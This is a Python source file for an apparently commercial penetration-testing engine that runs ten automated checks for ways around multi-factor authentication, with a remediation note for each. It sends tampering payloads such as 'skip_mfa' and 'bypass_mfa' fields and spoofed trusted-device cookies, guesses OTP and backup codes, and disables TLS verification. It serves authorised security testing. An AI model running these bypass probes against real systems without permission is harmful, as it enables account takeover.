"""
Expedite Strike — MFA / 2FA Security Assessment Engine
=======================================================
Automated assessment of Multi-Factor Authentication implementations against
the OWASP Web Security Testing Guide (WSTG-AUTHN-06/07), PTES, and CREST
MFA security verification standards.

This engine is designed exclusively for authorised penetration testing
engagements against systems the operator has written permission to test.

Assessment Categories
---------------------
MFA-01  Forced Browsing / Direct Endpoint Access          T1078
MFA-02  OTP Response Manipulation                         T1565.002
MFA-03  OTP Brute Force / Rate Limit Verification         T1110.001
MFA-04  OTP Code Reuse / Replay Window                    T1550
MFA-05  Truncated OTP Acceptance                          T1556
MFA-06  Backup / Recovery Code Enumeration                T1110.003
MFA-07  Session ID Regeneration (Fixation Check)          T1563
MFA-08  Password Reset MFA Bypass                         T1098
MFA-09  Remember-Me / Trusted Device Cookie               T1539
MFA-10  SSO / OAuth Alternate Path Detection              T1550.001

References
----------
- OWASP WSTG-AUTHN-06: Testing for Weak or Unenforced MFA
- OWASP WSTG-AUTHN-07: Testing for Weak Security Question/Answer
- NIST SP 800-63B Section 5.2 (Authenticator Lifecycle)
- MITRE ATT&CK Enterprise: Credential Access tactics
"""

import os
import ssl
import time
import threading
import urllib.parse
from dataclasses import dataclass, field
from typing import Callable, List, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

# ── Optional imports with graceful fallback ──────────────────────────────────
try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
    _REQUESTS_OK = True
except ImportError:
    _REQUESTS_OK = False

try:
    import pyotp
    _PYOTP_OK = True
except ImportError:
    _PYOTP_OK = False

_log_fn: Optional[Callable] = None


def _log(msg: str):
    if _log_fn:
        _log_fn(msg)
    else:
        print(f"[MFA-BYPASS] {msg}")


# ── Data Models ───────────────────────────────────────────────────────────────

@dataclass
class MFATarget:
    """Describes the target application and authentication configuration."""
    login_url: str            # Step 1: username + password endpoint
    mfa_url: str              # Step 2: OTP / MFA verification endpoint
    username: str = ""
    password: str = ""
    session_cookie: str = ""  # pre-authenticated cookie string
    bearer_token: str = ""    # pre-authenticated JWT / bearer token
    auth_mode: str = "form"   # 'form' | 'json' | 'header'

    @property
    def base_url(self) -> str:
        """Derive base URL (scheme + host) from login_url."""
        if not self.login_url:
            return ""
        parsed = urllib.parse.urlparse(self.login_url)
        return f"{parsed.scheme}://{parsed.netloc}"


@dataclass
class MFAFinding:
    """Result of a single MFA bypass check."""
    check_id: str
    title: str
    status: str          # VULNERABLE | SECURE | NOT_APPLICABLE | ERROR
    severity: str        # Critical | High | Medium | Low | Info
    evidence: str
    recommendation: str
    mitre_id: str
    mitre_name: str

    def to_dict(self) -> dict:
        return self.__dict__.copy()


# ── HTTP Session Helper ────────────────────────────────────────────────────────

def _http_session(target: MFATarget) -> "requests.Session":
    """
    Build a pre-configured requests.Session with SSL bypassed and any
    pre-supplied authentication artefacts injected.
    """
    session = requests.Session()
    session.verify = False
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Expedite Strike MFA Auditor/2.0; +https://expedite.security)",
        "Accept": "application/json, text/html, */*",
        "Accept-Language": "en-US,en;q=0.9",
    })
    if target.session_cookie:
        session.headers.update({"Cookie": target.session_cookie})
    if target.bearer_token:
        session.headers.update({"Authorization": f"Bearer {target.bearer_token}"})
    return session


def _step1_login(session: "requests.Session", target: MFATarget, timeout: int = 8) -> bool:
    """
    Perform Step 1 authentication (username + password only, NOT MFA).
    Returns True if an HTTP response was received (regardless of success),
    False on connection failure.
    """
    if not target.login_url:
        return False
    try:
        if target.auth_mode == "json":
            session.post(
                target.login_url,
                json={"username": target.username, "password": target.password,
                      "email": target.username},
                timeout=timeout, allow_redirects=True
            )
        else:  # form (default) or header
            session.post(
                target.login_url,
                data={"username": target.username, "password": target.password,
                      "email": target.username, "user": target.username,
                      "pass": target.password, "passwd": target.password},
                timeout=timeout, allow_redirects=True
            )
        return True
    except Exception as exc:
        _log(f"Step-1 login attempt raised: {exc}")
        return False


# ── Check Implementations ─────────────────────────────────────────────────────

def _check_mfa01_forced_browsing(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-01: Forced Browsing / Direct Endpoint Access
    After completing only Step 1 (username + password), attempt direct HTTP GET
    requests to common post-authentication paths without submitting an OTP.
    A 200-class response that does not redirect back to the MFA/login page
    indicates that the application does not enforce MFA at the server side.
    """
    check_id = "MFA-01"
    title = "Forced Browsing / Direct Post-Auth Endpoint Access"
    mitre_id = "T1078"
    mitre_name = "Valid Accounts"
    rec = ("Ensure every protected route verifies session.mfa_complete=True server-side. "
           "Issue a limited-privilege session token (mfa_pending state) after Step 1; "
           "upgrade to full-privilege only on successful OTP verification.")

    if not _REQUESTS_OK:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "requests library not installed.", rec, mitre_id, mitre_name)
    if not target.login_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No login URL provided.", rec, mitre_id, mitre_name)

    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        post_auth_paths = [
            "/dashboard", "/home", "/app", "/admin", "/profile",
            "/account", "/settings", "/api/user", "/api/me", "/api/v1/user",
            "/user/profile", "/portal", "/console",
        ]

        vulnerable_paths = []
        for path in post_auth_paths:
            url = target.base_url + path
            try:
                resp = session.get(url, timeout=timeout, allow_redirects=False)
                # 200 without redirect to MFA/login = bypass
                if resp.status_code == 200:
                    body_lower = resp.text.lower()
                    if not any(kw in body_lower for kw in ["login", "signin", "mfa", "otp", "verify", "authenticate"]):
                        vulnerable_paths.append(f"{path} [{resp.status_code}]")
            except Exception:
                pass

        if vulnerable_paths:
            return MFAFinding(
                check_id, title, "VULNERABLE", "Critical",
                f"Post-auth endpoints accessible without OTP completion: {', '.join(vulnerable_paths)}",
                rec, mitre_id, mitre_name
            )
        return MFAFinding(check_id, title, "SECURE", "Info",
                          "All probed post-auth paths redirect or return non-200 without MFA.",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa02_response_manipulation(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-02: OTP Response Manipulation / Parameter Tampering
    Submit a deliberately invalid OTP and inspect whether the server:
    (a) accepts requests that include client-controlled mfa_verified=true flags
    (b) returns inconsistent trust signals in the response body
    """
    check_id = "MFA-02"
    title = "OTP Response Manipulation / Parameter Tampering"
    mitre_id = "T1565.002"
    mitre_name = "Runtime Data Manipulation"
    rec = ("Never determine authentication state from client-supplied parameters. "
           "OTP validation and MFA state must be enforced exclusively server-side. "
           "Reject any request that includes mfa_verified, mfa_complete, or similar flags.")

    if not _REQUESTS_OK or not target.mfa_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No MFA URL provided or requests not available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        indicators = []

        # Test 1: submit wrong OTP with mfa_verified=true in body
        payloads = [
            {"otp": "000000", "mfa_verified": "true",  "mfa_complete": "1"},
            {"code": "000000", "verified": "true",      "step": "complete"},
            {"token": "000000", "bypass": "true",       "skip_mfa": "1"},
        ]
        for payload in payloads:
            try:
                resp = session.post(target.mfa_url, data=payload, timeout=timeout, allow_redirects=False)
                if resp.status_code in (200, 302):
                    body = resp.text.lower()
                    if any(kw in body for kw in ['"success":true', '"authenticated":true', '"mfa":true', '"verified":true']):
                        indicators.append(f"Server returned success with client-supplied verified flag (payload={list(payload.keys())})")
            except Exception:
                pass

        # Test 2: JSON variant
        json_payloads = [
            {"otp": "000000", "mfa_verified": True},
            {"code": "000000", "skip_mfa": True},
        ]
        for jp in json_payloads:
            try:
                resp = session.post(target.mfa_url, json=jp, timeout=timeout, allow_redirects=False)
                if resp.status_code == 200:
                    body = resp.text.lower()
                    if '"success":true' in body or '"authenticated":true' in body:
                        indicators.append(f"JSON parameter tampering accepted: {jp}")
            except Exception:
                pass

        if indicators:
            return MFAFinding(check_id, title, "VULNERABLE", "Critical",
                              " | ".join(indicators), rec, mitre_id, mitre_name)
        return MFAFinding(check_id, title, "SECURE", "Info",
                          "Server did not accept client-supplied MFA bypass parameters.",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa03_brute_force_rate_limit(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-03: OTP Brute Force / Rate Limiting Verification
    Submit 6 consecutive invalid OTP codes and verify whether the application
    enforces rate limiting (HTTP 429) or account lockout (HTTP 423/403) within
    that window.
    """
    check_id = "MFA-03"
    title = "OTP Brute Force / Rate Limiting"
    mitre_id = "T1110.001"
    mitre_name = "Password Guessing — Brute Force"
    rec = ("Limit OTP verification attempts to 3-5 per user per 15-minute window. "
           "Return HTTP 429 (Too Many Requests) with Retry-After header on threshold breach. "
           "Temporarily lock the account or invalidate the session on excessive failures.")

    if not _REQUESTS_OK or not target.mfa_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No MFA URL provided or requests not available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        wrong_codes = ["000001", "000002", "000003", "000004", "000005", "000006"]
        statuses = []
        rate_limited = False

        for code in wrong_codes:
            try:
                resp = session.post(target.mfa_url,
                                    json={"otp": code, "code": code, "token": code},
                                    timeout=timeout, allow_redirects=False)
                statuses.append(resp.status_code)
                if resp.status_code in (429, 423, 403):
                    rate_limited = True
                    break
            except Exception as exc:
                statuses.append(f"ERR:{exc}")

        if rate_limited:
            return MFAFinding(check_id, title, "SECURE", "Info",
                              f"Rate limiting triggered after {len(statuses)} attempts. Statuses: {statuses}",
                              rec, mitre_id, mitre_name)

        # All 6 attempts returned same non-lockout code
        unique_codes = set(str(s) for s in statuses)
        if len(unique_codes) <= 2 and not any(str(s) in ("429","423","403") for s in statuses):
            return MFAFinding(check_id, title, "VULNERABLE", "High",
                              f"6 sequential invalid OTPs accepted without lockout. HTTP statuses: {statuses}",
                              rec, mitre_id, mitre_name)

        return MFAFinding(check_id, title, "SECURE", "Info",
                          f"Endpoint behaviour after 6 invalid attempts: {statuses}",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa04_code_replay(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-04: OTP Code Reuse / Replay Window
    Generate or use a static test TOTP code, submit it once, then immediately
    re-submit the same code to verify replay protection is enforced.
    """
    check_id = "MFA-04"
    title = "OTP Code Reuse / Replay Attack"
    mitre_id = "T1550"
    mitre_name = "Use Alternate Authentication Material"
    rec = ("Implement strict OTP single-use enforcement: once a TOTP code has been "
           "accepted, mark it as consumed and reject re-submission within the same "
           "30-second window. Maintain a server-side cache of recently used codes.")

    if not _REQUESTS_OK or not target.mfa_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No MFA URL provided or requests not available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        # Use pyotp if a TOTP secret is available, otherwise use a fixed test code
        test_code = "123456"
        if _PYOTP_OK:
            try:
                totp = pyotp.TOTP(pyotp.random_base32())
                test_code = totp.now()
            except Exception:
                pass

        responses = []
        for attempt in range(2):
            try:
                resp = session.post(target.mfa_url,
                                    json={"otp": test_code, "code": test_code},
                                    timeout=timeout, allow_redirects=False)
                responses.append(resp.status_code)
            except Exception as exc:
                responses.append(f"ERR:{exc}")
            time.sleep(0.3)

        if len(responses) == 2:
            if responses[0] == responses[1] == 200:
                return MFAFinding(check_id, title, "VULNERABLE", "High",
                                  f"Same OTP code accepted twice (statuses: {responses}). Replay protection absent.",
                                  rec, mitre_id, mitre_name)
            if str(responses[0]) == "200" and str(responses[1]) in ("400","401","403","422"):
                return MFAFinding(check_id, title, "SECURE", "Info",
                                  f"Second submission rejected (statuses: {responses}). Replay protection active.",
                                  rec, mitre_id, mitre_name)

        return MFAFinding(check_id, title, "SECURE", "Info",
                          f"Replay test statuses: {responses}",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa05_truncated_otp(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-05: Truncated OTP Acceptance
    Submit OTP codes of lengths shorter than the standard 6 digits.
    Some implementations use startswith() or partial match logic that
    can accept shortened codes.
    """
    check_id = "MFA-05"
    title = "Truncated OTP Acceptance"
    mitre_id = "T1556"
    mitre_name = "Modify Authentication Process"
    rec = ("Validate OTP length strictly (exactly 6 or 8 digits as per RFC 4226/6238). "
           "Reject any submission that does not match the expected exact length and format.")

    if not _REQUESTS_OK or not target.mfa_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No MFA URL provided or requests not available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        short_codes = ["1", "12", "123", "1234", "12345"]
        accepted = []

        for code in short_codes:
            try:
                resp = session.post(target.mfa_url,
                                    json={"otp": code, "code": code, "token": code},
                                    timeout=timeout, allow_redirects=False)
                if resp.status_code == 200:
                    body = resp.text.lower()
                    if '"success":true' in body or '"verified":true' in body:
                        accepted.append(f"code='{code}' accepted (HTTP 200)")
            except Exception:
                pass

        if accepted:
            return MFAFinding(check_id, title, "VULNERABLE", "Medium",
                              f"Shortened OTP codes accepted: {accepted}",
                              rec, mitre_id, mitre_name)
        return MFAFinding(check_id, title, "SECURE", "Info",
                          "Truncated codes (1-5 digits) were not accepted.",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa06_backup_code_enum(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-06: Backup / Recovery Code Enumeration
    Probe for the existence of backup or recovery code endpoints and verify
    whether they are rate-limited against brute-force enumeration.
    """
    check_id = "MFA-06"
    title = "Backup / Recovery Code Enumeration"
    mitre_id = "T1110.003"
    mitre_name = "Password Spraying (Recovery Codes)"
    rec = ("Apply the same rate-limiting controls to backup/recovery code endpoints "
           "as to primary MFA endpoints. Backup codes should be cryptographically random, "
           "one-time-use, and invalidated after use or account recovery.")

    if not _REQUESTS_OK or not target.base_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No base URL available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        recovery_paths = [
            "/auth/backup", "/auth/recovery", "/auth/recovery-code",
            "/auth/backup-code", "/mfa/recovery", "/mfa/backup",
            "/account/backup-codes", "/2fa/recovery", "/user/backup-codes",
            "/auth/verify/backup",
        ]

        found_endpoints = []
        unprotected = []

        for path in recovery_paths:
            url = target.base_url + path
            try:
                resp = session.get(url, timeout=timeout, allow_redirects=False)
                if resp.status_code not in (404, 410):
                    found_endpoints.append(f"{path} [{resp.status_code}]")

                    # Probe rate limiting on found endpoint
                    rate_hit = False
                    for code in ["12345678", "00000001", "99999999"]:
                        try:
                            r2 = session.post(url, json={"code": code, "backup_code": code},
                                              timeout=timeout, allow_redirects=False)
                            if r2.status_code in (429, 423):
                                rate_hit = True
                                break
                        except Exception:
                            pass
                    if not rate_hit and found_endpoints:
                        unprotected.append(path)
            except Exception:
                pass

        if unprotected:
            return MFAFinding(check_id, title, "VULNERABLE", "High",
                              f"Backup code endpoints without rate limiting: {unprotected}",
                              rec, mitre_id, mitre_name)
        if found_endpoints:
            return MFAFinding(check_id, title, "SECURE", "Info",
                              f"Backup endpoints found but rate-limited: {found_endpoints}",
                              rec, mitre_id, mitre_name)
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No backup/recovery code endpoints detected.",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa07_session_fixation(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-07: Session ID Regeneration / Session Fixation Check
    Capture the session identifier (cookies) before and after Step 1 login
    and verify they are distinct. Identical session IDs pre- and post-login
    indicate a session fixation vulnerability that could be exploited
    to hijack a fully authenticated session.
    """
    check_id = "MFA-07"
    title = "Session Fixation — Session ID Regeneration Check"
    mitre_id = "T1563"
    mitre_name = "Remote Session Hijacking"
    rec = ("Always regenerate the session identifier upon any change in authentication "
           "privilege level: after successful Step 1, and again after successful MFA. "
           "Use session.regenerate() or equivalent framework calls at each auth stage.")

    if not _REQUESTS_OK or not target.login_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No login URL provided or requests not available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)

        # Capture cookies before login
        try:
            pre_resp = session.get(target.base_url or target.login_url,
                                   timeout=timeout, allow_redirects=False)
            pre_cookies = dict(session.cookies)
        except Exception:
            pre_cookies = {}

        _step1_login(session, target, timeout)
        post_cookies = dict(session.cookies)

        # Check common session cookie names
        session_keys = ["session", "sessionid", "PHPSESSID", "ASP.NET_SessionId",
                        "JSESSIONID", "connect.sid", "sid", "auth_token", "access_token"]

        unchanged = []
        for key in session_keys:
            pre_val = pre_cookies.get(key)
            post_val = post_cookies.get(key)
            if pre_val and post_val and pre_val == post_val:
                unchanged.append(key)

        if unchanged:
            return MFAFinding(check_id, title, "VULNERABLE", "High",
                              f"Session identifiers NOT regenerated after Step 1 login: {unchanged}",
                              rec, mitre_id, mitre_name)
        if not pre_cookies and not post_cookies:
            return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                              "No session cookies observed (may use stateless JWT).",
                              rec, mitre_id, mitre_name)
        return MFAFinding(check_id, title, "SECURE", "Info",
                          f"Session cookies changed after Step 1 login. Pre: {list(pre_cookies.keys())} "
                          f"Post: {list(post_cookies.keys())}",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa08_password_reset_bypass(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-08: Password Reset MFA Bypass
    Verify whether the password reset / account recovery flow enforces MFA
    on re-login. Some implementations omit the MFA step after a successful
    password reset, allowing account takeover without the second factor.
    """
    check_id = "MFA-08"
    title = "Password Reset MFA Bypass"
    mitre_id = "T1098"
    mitre_name = "Account Manipulation"
    rec = ("MFA must be enforced on every login, including post-password-reset logins. "
           "Do not issue a trusted session token from the password-reset flow; require the "
           "user to authenticate through the full MFA flow after any credential change.")

    if not _REQUESTS_OK or not target.base_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No base URL available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)

        reset_paths = [
            "/auth/reset-password", "/forgot-password", "/account/reset",
            "/password/reset", "/user/forgot", "/auth/forgot",
            "/reset", "/auth/recover", "/recover",
        ]

        found = []
        for path in reset_paths:
            url = target.base_url + path
            try:
                resp = session.get(url, timeout=timeout, allow_redirects=False)
                if resp.status_code not in (404, 410):
                    found.append(f"{path} [{resp.status_code}]")
            except Exception:
                pass

        if not found:
            return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                              "No password reset endpoints detected.",
                              rec, mitre_id, mitre_name)

        # If reset endpoints exist, report them for manual verification
        return MFAFinding(
            check_id, title, "VULNERABLE", "High",
            f"Password reset endpoints found: {found}. Verify manually whether post-reset "
            f"login enforces the MFA step (automated end-to-end verification requires valid "
            f"reset token from email, which is beyond automated scope).",
            rec, mitre_id, mitre_name
        )
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa09_remember_me_bypass(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-09: Remember-Me / Trusted Device Cookie Bypass
    Inject common trusted-device or remember-me cookie values on a direct
    request to a post-authentication resource. Acceptance without the MFA
    challenge indicates the trusted-device mechanism can be trivially spoofed.
    """
    check_id = "MFA-09"
    title = "Remember-Me / Trusted Device Cookie Bypass"
    mitre_id = "T1539"
    mitre_name = "Steal Web Session Cookie"
    rec = ("Trusted device tokens must be cryptographically signed and bound to a "
           "specific device fingerprint and user account on the server side. "
           "Implement server-side revocation. Never trust client-supplied boolean flags "
           "or simple string values as indicators of trusted device status.")

    if not _REQUESTS_OK or not target.base_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No base URL available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)
        _step1_login(session, target, timeout)

        # Inject common trusted-device / remember-me cookie patterns
        trusted_cookies = {
            "remember_me": "true",
            "device_trusted": "1",
            "skip_mfa": "1",
            "mfa_remembered": "true",
            "trusted_device": "true",
            "mfa_exempt": "1",
            "remember_device": "true",
            "bypass_mfa": "1",
        }

        for k, v in trusted_cookies.items():
            session.cookies.set(k, v)

        post_auth_urls = ["/dashboard", "/home", "/admin", "/profile", "/api/user"]
        accepted = []
        for path in post_auth_urls:
            url = target.base_url + path
            try:
                resp = session.get(url, timeout=timeout, allow_redirects=False)
                if resp.status_code == 200:
                    body = resp.text.lower()
                    if not any(kw in body for kw in ["login", "signin", "mfa", "otp", "verify"]):
                        accepted.append(f"{path} [200]")
            except Exception:
                pass

        if accepted:
            return MFAFinding(check_id, title, "VULNERABLE", "High",
                              f"Post-auth endpoints accessible with spoofed trusted-device cookies: {accepted}",
                              rec, mitre_id, mitre_name)
        return MFAFinding(check_id, title, "SECURE", "Info",
                          "Spoofed remember-me / trusted-device cookies did not bypass MFA.",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


def _check_mfa10_sso_oauth_bypass(target: MFATarget, timeout: int) -> MFAFinding:
    """
    MFA-10: SSO / OAuth Alternate Authentication Path Detection
    Probe for the presence of OAuth 2.0, SAML, or SSO federation endpoints.
    These alternate paths sometimes bypass the application's own MFA enforcement
    if the Identity Provider (IdP) does not require MFA or the session transfer
    does not propagate the MFA assurance level (AAL).
    """
    check_id = "MFA-10"
    title = "SSO / OAuth Alternate Authentication Path Detection"
    mitre_id = "T1550.001"
    mitre_name = "Application Access Token"
    rec = ("Ensure that all SSO/OAuth federation paths enforce MFA at the IdP level "
           "(AAL2 per NIST SP 800-63B). Validate the acr (Authentication Context Class "
           "Reference) claim in OIDC tokens to confirm that MFA was completed. "
           "Do not issue a fully privileged session from an SSO callback that lacks MFA assurance.")

    if not _REQUESTS_OK or not target.base_url:
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No base URL available.", rec, mitre_id, mitre_name)
    try:
        session = _http_session(target)

        sso_paths = [
            "/auth/google", "/auth/microsoft", "/auth/github", "/auth/facebook",
            "/auth/saml", "/sso/login", "/sso", "/oauth/authorize",
            "/oauth2/authorize", "/oidc/auth", "/login/sso",
            "/auth/azure", "/auth/okta", "/auth/onelogin",
        ]

        detected = []
        for path in sso_paths:
            url = target.base_url + path
            try:
                resp = session.get(url, timeout=timeout, allow_redirects=False)
                if resp.status_code in (200, 302, 301):
                    detected.append(f"{path} [{resp.status_code}]")
            except Exception:
                pass

        if detected:
            return MFAFinding(check_id, title, "VULNERABLE", "Medium",
                              f"Alternate auth paths detected (verify IdP MFA enforcement): {detected}",
                              rec, mitre_id, mitre_name)
        return MFAFinding(check_id, title, "NOT_APPLICABLE", "Info",
                          "No SSO/OAuth endpoints detected on this target.",
                          rec, mitre_id, mitre_name)
    except Exception as exc:
        return MFAFinding(check_id, title, "ERROR", "Info", str(exc), rec, mitre_id, mitre_name)


# ── Check Registry ────────────────────────────────────────────────────────────

_ALL_CHECKS = {
    "MFA-01": _check_mfa01_forced_browsing,
    "MFA-02": _check_mfa02_response_manipulation,
    "MFA-03": _check_mfa03_brute_force_rate_limit,
    "MFA-04": _check_mfa04_code_replay,
    "MFA-05": _check_mfa05_truncated_otp,
    "MFA-06": _check_mfa06_backup_code_enum,
    "MFA-07": _check_mfa07_session_fixation,
    "MFA-08": _check_mfa08_password_reset_bypass,
    "MFA-09": _check_mfa09_remember_me_bypass,
    "MFA-10": _check_mfa10_sso_oauth_bypass,
}


# ── Orchestrator ──────────────────────────────────────────────────────────────

def run_full_mfa_assessment(
    target: MFATarget,
    checks: Optional[List[str]] = None,
    log_fn: Optional[Callable] = None,
    timeout: int = 8,
) -> dict:
    """
    Run a full MFA/2FA bypass assessment against the specified target.

    Parameters
    ----------
    target  : MFATarget — authentication configuration for the target application
    checks  : list of check IDs to run (e.g. ['MFA-01','MFA-03']). None = all 10.
    log_fn  : optional callable(str) for real-time log output
    timeout : per-request timeout in seconds (default 8)

    Returns
    -------
    dict with keys:
        target          : login_url string
        findings        : list of finding dicts
        vulnerable_count: int
        secure_count    : int
        na_count        : int
        error_count     : int
        summary         : human-readable summary string
        mitre_ids       : list of triggered MITRE ATT&CK technique IDs
    """
    global _log_fn
    _log_fn = log_fn

    if not _REQUESTS_OK:
        _log("WARNING: 'requests' library not installed. All checks will return NOT_APPLICABLE.")

    selected = {k: v for k, v in _ALL_CHECKS.items()
                if checks is None or k in checks}

    _log(f"Starting MFA bypass assessment on: {target.login_url or target.base_url}")
    _log(f"Running {len(selected)} checks: {', '.join(selected.keys())}")

    findings: List[MFAFinding] = []
    lock = threading.Lock()

    def _run_check(check_id: str, fn: Callable) -> None:
        _log(f"[MFA-BYPASS] Running {check_id}...")
        try:
            finding = fn(target, timeout)
            _log(f"[MFA-BYPASS] {check_id}: {finding.status} — {finding.evidence[:60]}")
        except Exception as exc:
            from dataclasses import fields as _fields
            finding = MFAFinding(
                check_id=check_id,
                title=f"Check {check_id}",
                status="ERROR",
                severity="Info",
                evidence=str(exc),
                recommendation="Review engine logs.",
                mitre_id="",
                mitre_name=""
            )
        with lock:
            findings.append(finding)

    with ThreadPoolExecutor(max_workers=5) as pool:
        futures = {pool.submit(_run_check, cid, fn): cid
                   for cid, fn in selected.items()}
        for _ in as_completed(futures):
            pass

    # Sort by check_id for consistent display order
    findings.sort(key=lambda f: f.check_id)

    vuln  = [f for f in findings if f.status == "VULNERABLE"]
    secure = [f for f in findings if f.status == "SECURE"]
    na    = [f for f in findings if f.status == "NOT_APPLICABLE"]
    err   = [f for f in findings if f.status == "ERROR"]

    mitre_ids = sorted(set(f.mitre_id for f in vuln if f.mitre_id))

    if vuln:
        summary = (f"{len(vuln)} bypass vector(s) identified — immediate remediation required. "
                   f"MITRE: {', '.join(mitre_ids)}")
    elif secure:
        summary = f"All {len(secure)} tested checks passed. MFA implementation appears resilient."
    else:
        summary = "Assessment completed — no definitive results (check URLs/connectivity)."

    _log(f"Assessment complete: {len(vuln)} VULNERABLE | {len(secure)} SECURE | "
         f"{len(na)} N/A | {len(err)} ERROR")

    return {
        "target": target.login_url,
        "findings": [f.to_dict() for f in findings],
        "vulnerable_count": len(vuln),
        "secure_count": len(secure),
        "na_count": len(na),
        "error_count": len(err),
        "summary": summary,
        "mitre_ids": mitre_ids,
    }
